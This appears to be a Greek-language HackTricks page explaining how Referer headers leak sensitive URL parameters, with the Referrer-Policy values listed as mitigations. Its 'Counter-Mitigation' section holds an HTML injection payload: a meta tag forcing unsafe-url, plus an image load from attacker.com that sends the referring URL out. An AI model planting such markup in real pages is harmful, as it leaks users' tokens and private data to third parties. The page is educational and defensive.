{{#include ../banners/hacktricks-training.md}}

# Referrer headers and policy

Referrer είναι η κεφαλίδα που χρησιμοποιούν οι φυλλομετρητές για να υποδείξουν ποια ήταν η προηγούμενη σελίδα που επισκέφτηκε ο χρήστης.

## Ευαίσθητες πληροφορίες που διαρρέουν

Αν σε κάποιο σημείο μέσα σε μια ιστοσελίδα οποιαδήποτε ευαίσθητη πληροφορία βρίσκεται σε παραμέτρους GET αιτήματος, αν η σελίδα περιέχει συνδέσμους σε εξωτερικές πηγές ή αν ένας επιτιθέμενος είναι σε θέση να κάνει/προτείνει (κοινωνική μηχανική) στον χρήστη να επισκεφτεί μια διεύθυνση URL που ελέγχεται από τον επιτιθέμενο. Θα μπορούσε να είναι σε θέση να εξάγει τις ευαίσθητες πληροφορίες μέσα στο τελευταίο GET αίτημα.

## Mitigation

Μπορείτε να κάνετε τον φυλλομετρητή να ακολουθεί μια **Referrer-policy** που θα μπορούσε να **αποφύγει** την αποστολή ευαίσθητων πληροφοριών σε άλλες διαδικτυακές εφαρμογές:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Counter-Mitigation

Μπορείτε να παρακάμψετε αυτόν τον κανόνα χρησιμοποιώντας μια ετικέτα HTML meta (ο επιτιθέμενος πρέπει να εκμεταλλευτεί και μια HTML injection):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Άμυνα

Ποτέ μην τοποθετείτε ευαίσθητα δεδομένα μέσα σε παραμέτρους GET ή διαδρομές στη διεύθυνση URL.

{{#include ../banners/hacktricks-training.md}}
